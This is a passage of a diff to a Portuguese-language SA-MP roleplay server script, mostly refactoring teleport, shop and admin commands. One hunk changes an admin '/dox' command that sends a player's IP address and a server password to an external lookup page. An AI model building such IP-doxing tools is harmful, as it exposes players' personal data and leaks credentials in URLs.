+			SetPlayerPosEx(playerid, x, y, z+0.2, 0, 0);
+
 	        return 1;
 	    }
-	    
-		SetPlayerInterior(playerid, 0);
-		SetPlayerVirtualWorld(playerid, 0);
-		SetPlayerPosEx(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ]+0.2);
+
+		SetPlayerPosEx(playerid, hInfo[hID][EnterX], hInfo[hID][EnterY], hInfo[hID][EnterZ]+0.2, 0, 0);
 
 		return 1;
 	}
-	
+
 	new buID = IsPlayerAtBuildingExit(playerid);
-	
+
 	if(buID != 0)
 	{
-		SetPlayerInterior(playerid, 0);
-		SetPlayerVirtualWorld(playerid, 0);
-		SetPlayerPosEx(playerid, buInfo[buID][EnterX], buInfo[buID][EnterY], buInfo[buID][EnterZ]+0.2);
+		SetPlayerPosEx(playerid, buInfo[buID][EnterX], buInfo[buID][EnterY], buInfo[buID][EnterZ]+0.2, 0, 0);
 
 		return 1;
 	}
@@ -21011,7 +21003,7 @@ COMMAND:sair(playerid, params[], help)
 COMMAND:entrar(playerid, params[], help)
 {
 	new bID = IsPlayerAtBizEntrance(playerid);
-	
+
 	if(bID != 0)
 	{
 	    if(bInfo[bID][Locked] == 0)
@@ -21021,20 +21013,17 @@ COMMAND:entrar(playerid, params[], help)
 			    if(GetPlayerMoneyEx(playerid) < bInfo[bID][Entrada]) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 
 				new string[128];
-			    
+
 				GivePlayerMoneyEx(playerid, -bInfo[bID][Entrada]);
 				bInfo[bID][Bank] += bInfo[bID][Entrada];
-				
+
 				format(string, sizeof(string), "Pagaste %d$ para entrares em %s", bInfo[bID][Entrada], bInfo[bID][Nome]);
 				SendClientMessage(playerid, COLOR_INFO, string);
 			}
-			
-			SetPlayerInterior(playerid, bInfo[bID][Interior]);
-			SetPlayerVirtualWorld(playerid, bID);
-			SetPlayerFacingAngle(playerid, bInfo[bID][ExitAngle]);
 
-			SetPlayerPosEx(playerid, bInfo[bID][ExitX], bInfo[bID][ExitY], bInfo[bID][ExitZ]);
-			
+			SetPlayerFacingAngle(playerid, bInfo[bID][ExitAngle]);
+			SetPlayerPosEx(playerid, bInfo[bID][ExitX], bInfo[bID][ExitY], bInfo[bID][ExitZ], bID, bInfo[bID][Interior]);
+
 			switch(bInfo[bID][Type])
 			{
 			    //case BTYPE_RESTAURANTE: { SendClientMessage(playerid, COLOR_CHAT, "[Comandos:] {FFFFFF}/comer"); }
@@ -21056,19 +21045,16 @@ COMMAND:entrar(playerid, params[], help)
 	        return 1;
 	    }
 	}
-	
+
 	new hID = IsPlayerAtHouseEntrance(playerid);
-	
+
 	if(hID != 0)
 	{
 	    if(hInfo[hID][Locked] == 0)
 	    {
-			SetPlayerInterior(playerid, hInfo[hID][Interior]);
-			SetPlayerVirtualWorld(playerid, hID);
 			SetPlayerFacingAngle(playerid, hInfo[hID][ExitAngle]);
+			SetPlayerPosEx(playerid, hInfo[hID][ExitX], hInfo[hID][ExitY], hInfo[hID][ExitZ], hID, hInfo[hID][Interior]);
 
-			SetPlayerPosEx(playerid, hInfo[hID][ExitX], hInfo[hID][ExitY], hInfo[hID][ExitZ]);
-			
 			return 1;
 	    }
  	    else
@@ -21077,19 +21063,15 @@ COMMAND:entrar(playerid, params[], help)
 	        return 1;
 	    }
 	}
-	
+
 	new buID = IsPlayerAtBuildingEntrance(playerid);
-	
+
 	if(buID != 0)
 	{
 	    if(buInfo[buID][Locked] == 0)
 	    {
-			SetPlayerVirtualWorld(playerid, buID);
-			SetPlayerInterior(playerid, buInfo[buID][Interior]);
 			SetPlayerFacingAngle(playerid, buInfo[buID][ExitAngle]);
-			SetPlayerVirtualWorld(playerid, buID);
-
-			SetPlayerPosEx(playerid, buInfo[buID][ExitX], buInfo[buID][ExitY], buInfo[buID][ExitZ]);
+			SetPlayerPosEx(playerid, buInfo[buID][ExitX], buInfo[buID][ExitY], buInfo[buID][ExitZ], buID, buInfo[buID][Interior]);
 
 			return 1;
 	    }
@@ -21099,9 +21081,9 @@ COMMAND:entrar(playerid, params[], help)
 	        return 1;
 	    }
 	}
-	
+
 	if(pInfo[playerid][Faction] == 0 && pInfo[playerid][Admin] == 0) return 1;
-	
+
 	if(fInfo[pInfo[playerid][Faction]][Type] == F_POLICIA || pInfo[playerid][Admin] != 0) // GARAGEM DOS APREENDIDOS
 	{
 	    if(IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][EntradaApreendidosX], oInfo[0][EntradaApreendidosY], oInfo[0][EntradaApreendidosZ]))
@@ -21118,13 +21100,11 @@ COMMAND:entrar(playerid, params[], help)
 	        }
 	        else
 	        {
-				SetPlayerInterior(playerid, oInfo[0][ApreendidosInterior]);
-				SetPlayerVirtualWorld(playerid, oInfo[0][ApreendidosVirtualWorld]);
-				SetPlayerPosEx(playerid, oInfo[0][ApreendidosX], oInfo[0][ApreendidosY], oInfo[0][ApreendidosZ]);
+				SetPlayerPosEx(playerid, oInfo[0][ApreendidosX], oInfo[0][ApreendidosY], oInfo[0][ApreendidosZ], oInfo[0][ApreendidosVirtualWorld], oInfo[0][ApreendidosInterior]);
 			}
 
             //IsInGaragemPSP[playerid] = true;
-            
+
 	        return 1;
 	    }
 		else if(IsPlayerInRangeOfPoint(playerid, 3.0, oInfo[0][ApreendidosX], oInfo[0][ApreendidosY], oInfo[0][ApreendidosZ]))
@@ -21142,9 +21122,7 @@ COMMAND:entrar(playerid, params[], help)
 	        }
 	        else
 	        {
-				SetPlayerInterior(playerid, oInfo[0][EntradaApreendidosInterior]);
-				SetPlayerVirtualWorld(playerid, oInfo[0][EntradaApreendidosVirtualWorld]);
-				SetPlayerPosEx(playerid, oInfo[0][EntradaApreendidosX], oInfo[0][EntradaApreendidosY], oInfo[0][EntradaApreendidosZ]);
+				SetPlayerPosEx(playerid, oInfo[0][EntradaApreendidosX], oInfo[0][EntradaApreendidosY], oInfo[0][EntradaApreendidosZ], oInfo[0][EntradaApreendidosVirtualWorld], oInfo[0][EntradaApreendidosInterior]);
 			}
 
             //IsInGaragemPSP[playerid] = false;
@@ -21152,7 +21130,7 @@ COMMAND:entrar(playerid, params[], help)
 	        return 1;
 	    }
 	}
-    
+
 	return 1;
 }
 
@@ -21160,22 +21138,22 @@ COMMAND:venderveiculo(playerid, params[], help)
 {
 	if(!IsPlayerInRangeOfPoint(playerid, 8.0, oInfo[0][VenderVeiculoX], oInfo[0][VenderVeiculoY], oInfo[0][VenderVeiculoZ])) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás na zona de vender veículo.");
 	if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-	
+
 	new string[128];
 	new car = GetPlayerVehicleID(playerid);
-	
+
    	if(pInfo[playerid][ChaveCarro1] != car && pInfo[playerid][ChaveCarro2] != car && pInfo[playerid][ChaveCarro3] != car && pInfo[playerid][ChaveCarro4] != car) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não és o proprietário desse veículo!");
 	if(pInfo[playerid][ChaveCarro1] == car) pInfo[playerid][ChaveCarro1] = 0;
 	if(pInfo[playerid][ChaveCarro2] == car) pInfo[playerid][ChaveCarro2] = 0;
 	if(pInfo[playerid][ChaveCarro3] == car) pInfo[playerid][ChaveCarro3] = 0;
 	if(pInfo[playerid][ChaveCarro4] == car) pInfo[playerid][ChaveCarro4] = 0;
-	
+
 	new valor, carprice = GetStandPrice(GetVehicleModel(car));
-	
+
 	if(pInfo[playerid][Golds] > 0)
 	{
 		valor = floatround(((floatround(carprice / 2, floatround_round)) / 100) * 75, floatround_round);
-		
+
 		format(string, sizeof(string), "Vendeste o teu veículo por %d$. (como és VIP recebeste 75 p/cento do valor original do carro)", valor);
 		SendClientMessage(playerid, COLOR_INFO, string);
 	}
@@ -21186,15 +21164,15 @@ COMMAND:venderveiculo(playerid, params[], help)
 		format(string, sizeof(string), "Vendeste o teu veículo por %d$.", valor);
 		SendClientMessage(playerid, COLOR_INFO, string);
 	}
-	
+
 	pInfo[playerid][Bank] += valor;
-	
+
 	RemoverJogadorDoCarro(playerid);
-	
+
 	new rX = random(50);
 	new rY = random(50);
 	new rZ = random(10);
-	
+
 	cInfo[car][Model] = 510;
 	cInfo[car][Color1] = 0;
 	cInfo[car][Color2] = 0;
@@ -21232,14 +21210,14 @@ COMMAND:venderveiculo(playerid, params[], help)
 	cInfo[car][X] = 304.7568 + rX;
 	cInfo[car][Y] = 1978.2449 + rY;
 	cInfo[car][Z] = 16.6059 + rZ;
-	
+
 	IsARespawn[car] = true;
 	DestroyVehicle(cInfo[car][ID]);
 	cInfo[car][ID] = CreateVehicle(cInfo[car][Model], cInfo[car][X], cInfo[car][Y], cInfo[car][Z], cInfo[car][Angle], cInfo[car][Color1], cInfo[car][Color2], -1, IsACopCar(cInfo[car][Model]) ? 1 : 0);
 	SetVehicleVirtualWorld(cInfo[car][ID], cInfo[car][VirtualWorld]);
 	LinkVehicleToInterior(cInfo[car][ID], cInfo[car][Interior]);
 	AtualizarDanosCarro(car);
-   	
+
 	return 1;
 }
 
@@ -21248,7 +21226,7 @@ COMMAND:comprarveiculo(playerid, params[], help)
 	//new bID = GetPlayerVirtualWorld(playerid);
 
 	//if(bInfo[bID][Type] != BTYPE_STAND) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no stand.");
-	
+
 	if(IsPlayerInRangeOfPoint(playerid, 15.0, 2510.8594, -1753.8397, 13.5748))
 	{
 	    ShowModelSelectionMenu(playerid, ListaCarrosComprar, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
@@ -21288,13 +21266,13 @@ COMMAND:catalogo(playerid, params[], help)
 	new bID = GetPlayerVirtualWorld(playerid);
 
 	if(bInfo[bID][Type] != BTYPE_ROUPA && bInfo[bID][Type] != BTYPE_STAND && bInfo[bID][Type] != BTYPE_247 && bInfo[bID][Type] != BTYPE_CACA ) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
-	
+
 	switch(bInfo[bID][Type])
 	{
 	    case BTYPE_STAND:
 	    {
 	        ShowModelSelectionMenu(playerid, ListaCarros, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
-	        
+
 	        PlayerActionMessage(playerid, 15.0, "pega no catálogo e vé os veículos.");
 	    }
 	    case BTYPE_ROUPA:
@@ -21313,7 +21291,7 @@ COMMAND:catalogo(playerid, params[], help)
 	    {
             Menu_Show(playerid, MenuArmas, 0x9FE5F5FF, false);
             TogglePlayerControllable(playerid, false);
-            
+
  			PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as armas.");
 	    }
 	}
@@ -21355,14 +21333,14 @@ COMMAND:catalogo(playerid, params[], help)
 	    {
 	        if(GetPlayerMoneyEx(playerid) < PRECO_TELE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
 	        if(pObjects[playerid][Telemovel] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um telemóvel");
-	        
+
 	        GivePlayerMoneyEx(playerid, -PRECO_TELE);
-	        
+
             PlayerActionMessage(playerid, 15.0, "recebe uma caixa com um telemóvel lá dentro.");
-	        
+
 	        pObjects[playerid][Telemovel] = 1;
 	        bInfo[bID][Produtos]--;
-	        
+
 	        SendClientMessage(playerid, COLOR_INFO, "Compraste um telemóvel");
 	    }
 	}
@@ -21378,15 +21356,15 @@ COMMAND:assinarcontrato(playerid, params[], help)
 	if(bInfo[bID][Type] != BTYPE_SEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Tipo de loja inválido.");
     if(GetPlayerMoneyEx(playerid) < PRECO_CONTSEGURADORA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
     if(pInfo[playerid][Seguradora] != 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens uma seguradora. Termina o contrato com ela primeiro.");
-    
+
     pInfo[playerid][Seguradora] = bID;
     pInfo[playerid][MensalidadeSeguradora] = bInfo[bID][Seguradora];
-    
+
     GivePlayerMoneyEx(playerid, -PRECO_CONTSEGURADORA);
     bInfo[bID][Bank] += PRECO_CONTSEGURADORA;
-    
+
     PlayerActionMessage(playerid, 15.0, "pega na caneta e assina o contrato.");
-    
+
     format(string, sizeof(string), "Assinaste contrato com a seguradora {00FF00}%s {52E3BA}com sucesso!", bInfo[bID][Nome]);
     SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -21432,25 +21410,25 @@ COMMAND:compraracessorio(playerid, params[], help)
 	new bID = GetPlayerVirtualWorld(playerid);
 	new r = random(3);
 	new action[32];
-	
+
 	if(bInfo[bID][Type] != BTYPE_RESTAURANTE) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Restaurante");
 	if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
 	if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
-	
+
 	SetPlayerHealthEx(playerid, 50, 1);
  	GivePlayerMoneyEx(playerid, -PRECO_COMIDA);
 	bInfo[bID][Bank] += PRECO_COMIDA;
 	bInfo[bID][Produtos]--;
- 	
+
  	switch(r)
  	{
 		case 0: { action = "come uma pizza."; ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 4.1, 0, 1, 1, 0, 2, 1); }
 		case 1: { action = "come uma sande."; ApplyAnimation(playerid, "FOOD", "EAT_Chicken",4.1, 0, 1, 1, 0, 2, 1); }
 		case 2: { action = "come umas bifanas."; ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2, 1); }
 	}
- 	
+
  	PlayerActionMessage(playerid, 15.0, action);
- 	
+
 	return 1;
 }*/
 
@@ -21487,15 +21465,15 @@ COMMAND:compraracessorio(playerid, params[], help)
  	        SetPlayerDrunkLevel(playerid, 50000);
  	    }
  	}
- 	
+
  	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_DRINK_BEER);
- 	
+
  	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA);
 	bInfo[bID][Bank] += PRECO_BEBIDA;
 	bInfo[bID][Produtos]--;
 
  	PlayerActionMessage(playerid, 15.0, "pega na garrafa e bebe.");
- 	
+
  	TimerDrunk[playerid] = SetTimerEx("MenosDrunk", 60000, true, "i", playerid);
 
 	return 1;
@@ -21529,16 +21507,16 @@ COMMAND:f(playerid, params[], help)
 }
 
 COMMAND:rg(playerid, params[], help)
-{ 
+{
 	new mensagem[128];
 
     if(sscanf(params, "s[128]", mensagem)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/rg <mensagem>");
-    
+
     if(pInfo[playerid][Faction] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás em nenhuma faction");
 	if(fInfo[pInfo[playerid][Faction]][Legal] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Faction Inválida");
-	
+
 	RadioMessageGlobal(playerid, pInfo[playerid][Faction], mensagem);
-	
+
 	return 1;
 }
 
@@ -21552,6 +21530,7 @@ COMMAND:b(playerid, params[], help)
 
 	format(string, sizeof(string), "%s", action);
  	ProxDetector(7.0, playerid, string);
+ 	ChatLog(playerid, action, true);
 
 	return 1;
 }
@@ -21559,14 +21538,14 @@ COMMAND:b(playerid, params[], help)
 COMMAND:me(playerid, params[], help)
 {
 	new action[64];
-	
+
     if(sscanf(params, "s[64]", action)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/me <ação>");
-    
+
 	new string[128];
-	
+
 	format(string, sizeof(string), "%s.", action);
 	PlayerActionMessage(playerid, 15.0, string);
-	
+
 	return 1;
 }
 
@@ -21575,9 +21554,9 @@ COMMAND:do(playerid, params[], help)
 	new action[64];
 
     if(sscanf(params, "s[64]", action)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/do <informação>");
-	
+
 	ProxDetectorDo(20.0, playerid, action);
-	
+
 	return 1;
 }
 
@@ -21592,7 +21571,7 @@ COMMAND:tentar(playerid, params[], help)
 	if(succeed == 1)
 	{
 		format(string, sizeof(string), "tenta %s e {00FF00}consegue{D65FE3}*.", action);
-		
+
 		ProxDetectorRP(10.0, playerid, string);
 		SetPlayerChatBubble(playerid, string, COLOR_ACTION, 15.0, 3000);
 	}
@@ -21610,10 +21589,10 @@ COMMAND:motor(playerid, params[], help)
 	new car = GetPlayerVehicleID(playerid);
  	new Float:health;
     GetVehicleHealth(car, health);
-    
+
     if(!IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
     if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOCAR);
-    
+
     if(AdminDuty[playerid] == false)
     {
         if(Motor[car] == false)
@@ -21683,11 +21662,11 @@ COMMAND:motor(playerid, params[], help)
 			SetVehicleParamsEx(car, 0,lights,alarm,doors,bonnet,boot,objective);
 			Motor[car] = false;
 			PlayerActionMessage(playerid, 15.0, "gira a chave na ignição e desliga o carro.");
-			
+
 			return 1;
 		}
 	}
-	
+
 	if(cInfo[car][Gasolina] == 0)
 	{
  		PlayerActionMessage(playerid, 15.0, "repara que o carro não tem gasolina.");
@@ -21697,7 +21676,7 @@ COMMAND:motor(playerid, params[], help)
 
     Motor[car] = true;
 	PlayerActionMessage(playerid, 15.0, "gira a chave na ignição.");
-	SetTimerEx("LigarMotor", 1500, false, "i", playerid);
+	SetPlayerTimer(playerid, "LigarMotor", 1500, false);
 
 	return 1;
 }
@@ -21723,7 +21702,7 @@ COMMAND:pagarmulta(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "O jogador %s pagou a sua multa de %d$", GetPlayerNameEx(playerid), CustoMulta[playerid]);
 	SendClientMessage(MultadorID[playerid], COLOR_INFO, string);
-	
+
 	fInfo[pInfo[MultadorID[playerid]][Faction]][Bank] += CustoMulta[playerid];
 
 	Multado[playerid] = false;
@@ -21740,12 +21719,12 @@ COMMAND:aceitarentrevista(playerid, params[], help)
 
 	SendClientMessage(playerid, COLOR_CHAT, "Aceitaste o pedido de entrevista!");
 	SendClientMessage(EntrevistadorID[playerid], COLOR_CHAT, "Aceitaram o teu pedido de entrevista! (/pararentrevista)");
-	
+
 	Entrevista[playerid] = false;
 	EntrevistadorID[playerid] = INVALID_PLAYER_ID;
 	ASerEntrevistado[playerid] = true;
 	AEntrevistar[EntrevistadorID[playerid]] = true;
-	
+
 	SendClientMessageToAll(COLOR_NEWS, "_____________________________________[ Entrevista ]_____________________________________");
 	SendClientMessageToAll(COLOR_NEWS, "                                ***Rádio SpringVale***");
 
@@ -21815,7 +21794,7 @@ COMMAND:aceitardesentoxicacao(playerid, params[], help)
 	Desentoxicar[playerid] = false;
 	PrecoDesentoxicar[playerid] = 0;
 	DesentoxicadorID[playerid] = 0;
-	
+
 	pInfo[playerid][ADesentoxicar] = 1;
 
 	return 1;
@@ -21929,7 +21908,7 @@ COMMAND:aceitarreparacao(playerid, params[], help)
 	new string[128];
 
 	new car = GetPlayerVehicleID(playerid);
-	
+
 	if(pInfo[playerid][SeguradoraPayCount] >= 10) // o seguro paga
 	{
         SendClientMessage(ReparadorID[playerid], COLOR_INFO, "O teu seguro pagou a reparação!");
@@ -21989,7 +21968,7 @@ COMMAND:aceitarpintura(playerid, params[], help)
 
 	cInfo[car][Color1] = Cor1[playerid];
 	cInfo[car][Color2] = Cor2[playerid];
-	
+
     ChangeVehicleColor(car, cInfo[car][Color1], cInfo[car][Color2]);
 
 	SendClientMessage(playerid, COLOR_INFO, string);
@@ -22010,16 +21989,15 @@ COMMAND:aceitarpintura(playerid, params[], help)
 COMMAND:staff(playerid, params[], help)
 {
 	new counter, string[128];
-	
+
 	SendClientMessage(playerid, COLOR_ERRO, "_____________________________________________ {00FF00}[ {FFFFFF}STAFF ONLINE {00FF00}] {FF0000}________________________________________________");
-	
+
 	foreach(new i : Player)
 	{
-	    // if(!IsPlayerConnected(i)) continue;
 	    if(pInfo[i][Admin] == 0) continue;
-	    
+
 	    counter++;
-	    
+
 	    if(pInfo[i][Admin] == 1 || pInfo[i][Admin] == 2)
 	    {
 	        if(AdminDuty[i] == false)
@@ -22081,9 +22059,9 @@ COMMAND:staff(playerid, params[], help)
 			SendClientMessage(playerid, COLOR_WHITE, string);
 		}
 	}
-	
+
 	if(counter == 0) { SendClientMessage(playerid, COLOR_INFO, "Não há staff online neste momento"); }
-	
+
 	SendClientMessage(playerid, COLOR_ERRO, "______________________________________________________________________________________________________________");
 
 	return 1;
@@ -22094,7 +22072,7 @@ COMMAND:acmds(playerid, params[], help)
     if(pInfo[playerid][Admin] == 0) return SendClientMessage(playerid, -1, MSG_NOADMIN);
 
 	SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
-	
+
 	if(pInfo[playerid][Admin] >= 1)
 	{
 	    SendClientMessage(playerid, COLOR_GM, "[GameMaster 1:] {FFFFFF}/kick - /aduty - /freeze - /unfreeze - /goto - /aj - /curar - /fixar - /serverstats");
@@ -22126,11 +22104,11 @@ COMMAND:acmds(playerid, params[], help)
 	if(pInfo[playerid][Admin] == 1337)
 	{
 	    SendClientMessage(playerid, COLOR_OWNER, "[Scripter:] {FFFFFF}/uptime - /performance - /forcesave - /close - /toggledebuguj - /toggledebug - /toggledebugkey - /checkip");
-	    SendClientMessage(playerid, COLOR_OWNER, "[Scripter:] {FFFFFF}/resetstats");
+	    SendClientMessage(playerid, COLOR_OWNER, "[Scripter:] {FFFFFF}/resetstats - /resetperformance");
 	}
-	
+
  	SendClientMessage(playerid, COLOR_ERRO, "___________________________________________________________________________________________________");
- 	
+
     return 1;
 }
 
@@ -22160,12 +22138,12 @@ COMMAND:spec(playerid, params[], help)
 
     if(sscanf(params, "d", giveplayerid)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/spec <playerid>");
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
-	
+
 	if(!IsPlayerInAnyVehicle(giveplayerid))
 	{
 	 	SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
 	 	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
-	 	
+
 	    TogglePlayerSpectating(playerid, 1);
 	    PlayerSpectatePlayer(playerid, giveplayerid);
 	}
@@ -22173,7 +22151,7 @@ COMMAND:spec(playerid, params[], help)
 	{
 	 	SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
 	 	SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
-	 	
+
 	    TogglePlayerSpectating(playerid, 1);
 	    PlayerSpectateVehicle(playerid, GetPlayerVehicleID(giveplayerid));
 	}
@@ -22187,7 +22165,7 @@ COMMAND:spec(playerid, params[], help)
 COMMAND:specoff(playerid, params[], help)
 {
 	if(pInfo[playerid][Admin] < 1) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-	
+
  	SetPlayerInterior(playerid, 0);
  	SetPlayerVirtualWorld(playerid, 0);
     TogglePlayerSpectating(playerid, 0);
@@ -22231,7 +22209,7 @@ COMMAND:resetstats(playerid, params[], help)
     sStats[0][Bans] = 0;
     sStats[0][Rotas] = 0;
     sStats[0][VIPs] = 0;
-    
+
     SendClientMessage(playerid, COLOR_INFO, "Server Stats resetados");
 
 	return 1;
@@ -22242,7 +22220,7 @@ COMMAND:serverstats(playerid, params[], help)
 	if(pInfo[playerid][Admin] < 1) return SendClientMessage(playerid, -1, MSG_NOADMIN);
 
 	new sdialog[1024];
-	
+
 	format(sdialog, sizeof(sdialog),
 	"Stat\tValor\n\
 	Número de conexões\t%d\n\
@@ -22273,9 +22251,9 @@ COMMAND:checkip(playerid, params[], help)
     foreach(new i : Player)
     {
         new playerIp[16];
-        
+
         GetPlayerIp(i, playerIp, sizeof(playerIp));
-        
+
         if(strfind(ipToCheck, playerIp, true) != -1)
         {
 			format(string, sizeof(string), "Jogador %s (ID:%d) encontrado com o IP [%s].", GetPlayerNameEx(i), i, playerIp);
@@ -22283,7 +22261,7 @@ COMMAND:checkip(playerid, params[], help)
 			found = 1;
         }
     }
-    
+
     if(found == 0)
     {
         SendClientMessage(playerid, COLOR_INFO, "Nenhum jogador com esse IP encontrado");
@@ -22302,10 +22280,10 @@ COMMAND:dox(playerid, params[], help)
 	if(!IsPlayerConnected(giveplayerid)) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOTCONNECTED);
 
 	GetPlayerIp(giveplayerid, playerIP, sizeof(playerIP));
-	
-	format(string, sizeof(string), "tools.portugalfunmaps.pt/gta/PCRP/dox.php?pw=%s&ip=%s", HTTP_PASSWORD, playerIP);
+
+	format(string, sizeof(string), "tools.diogomartino.pw/dox.php?pw=%s&ip=%s", HTTP_PASSWORD, playerIP);
 	HTTP(playerid, HTTP_GET, string, "", "HttpDox");
-	
+
 	format(string, sizeof(string), "A receber informações sobre o IP (%s) do jogador %s", playerIP, GetPlayerNameEx(giveplayerid));
 	SendClientMessage(playerid, COLOR_INFO, string);
 
@@ -22340,12 +22318,12 @@ COMMAND:addrota(playerid, params[], help)
 
     if(sscanf(params, "s[16]d", rotaname, num)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/addrota <nome da rota> <number>");
     if(num <= 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Número inválido (maior que 0)");
-    
+
     GetPlayerPos(playerid, pX, pY, pZ);
 
 	format(string, sizeof(string), "PCRP/Rotas/%s.ini", rotaname);
 
-	if(!fexist(string)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não existe essa rota");
+	if(!fexist(string)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa rota não existe");
 	else
 	{
 	    if(num > 1)
@@ -22360,7 +22338,7 @@ COMMAND:addrota(playerid, params[], help)
 		hFile = fopen(string, io_append);
 		fwrite(hFile, entry);
 		fclose(hFile);
-		
+
 		format(string, sizeof(string), "Rota %d criada em %s.", num, rotaname);
 		SendClientMessage(playerid, COLOR_INFO, string);
 	}
@@ -22377,14 +22355,14 @@ COMMAND:crota(playerid, params[], help)
     if(sscanf(params, "s[16]", rotaname)) return SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/crota <nome da rota>");
 
 	format(string, sizeof(string), "PCRP/Rotas/%s.ini", rotaname);
-	
+
 	if(fexist(string)) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já existe uma rota com esse nome.");
 	else
 	{
 		hFile = fopen(string, io_append);
 		fwrite(hFile, "");
 		fclose(hFile);
-		
+
 		SendClientMessage(playerid, COLOR_INFO, "Rota criada.");
 	}
 
@@ -22413,7 +22391,7 @@ COMMAND:dargold(playerid, params[], help)
 COMMAND:forcesave(playerid, params[], help)
 {
 	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);
-	
+
 	GuardarServidor();
 
 	SendClientMessage(playerid, COLOR_INFO, "Forçaste o backup do servidor!");
@@ -22426,7 +22404,7 @@ COMMAND:performance(playerid, params[], help)
 	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);
 
 	new string[128], comandos, onptext, updatejogador, onpkey, ping;
-	
+
 	if(TickCount == 0 || TickTotal == 0) comandos = 0; else comandos = floatround(TickTotal/TickCount, floatround_round);
 	if(TickCount_Text == 0 || TickTotal_Text == 0) onptext = 0; else onptext = floatround(TickTotal_Text/TickCount_Text, floatround_round);
 	if(TickCount_Update == 0 || TickTotal_Update == 0) updatejogador = 0; else updatejogador = floatround(TickTotal_Update/TickCount_Update, floatround_round);
@@ -22439,6 +22417,26 @@ COMMAND:performance(playerid, params[], help)
 	return 1;
 }
 
+COMMAND:resetperformance(playerid, params[], help)
+{
+	if(pInfo[playerid][Admin] != 1337) return SendClientMessage(playerid, -1, MSG_NOADMIN);
+
+	TickCount = 0;
+	TickTotal = 0;
+	TickCount_Text = 0;
+	TickTotal_Text = 0;
+	TickCount_Update = 0;
+	TickTotal_Update = 0;
+	TickCount_Key = 0;
+	TickTotal_Key = 0;
+	PingCount = 0;
+	PingTotal = 0;
+
+	SendClientMessage(playerid, COLOR_INFO, "Deste reset às estatísticas da performance do servidor.");
+
+	return 1;
+}
+
 COMMAND:permitirrotatodos(playerid, params[], help)
 {
 	if(pInfo[playerid][Admin] < 6) return SendClientMessage(playerid, -1, MSG_NOADMIN);
@@ -22447,8 +22445,6 @@ COMMAND:permitirrotatodos(playerid, params[], help)
 
     foreach(new i : Player)
     {
-        // if(!IsPlayerConnected(i)) continue;
-        
         pInfo[i][TempoRota] = 0;
     }
 
@@ -22471,7 +22467,7 @@ COMMAND:permitirrota(playerid, params[], help)
 	SendClientMessage(playerid, COLOR_INFO, string);
 	format(string, sizeof(string), "O Administrador %s deu-te permissão para fazeres uma rota.", GetPlayerNameEx(playerid));
 	SendClientMessage(giveplayerid, COLOR_INFO, string);
-	
+
 	pInfo[giveplayerid][TempoRota] = 0;
 
 	return 1;
@@ -22487,21 +22483,21 @@ COMMAND:darcarta(playerid, params[], help)
     {
         SendClientMessage(playerid, COLOR_CHAT, "[USO]: {FFFFFF}/darcarta <playerid> <carta>");
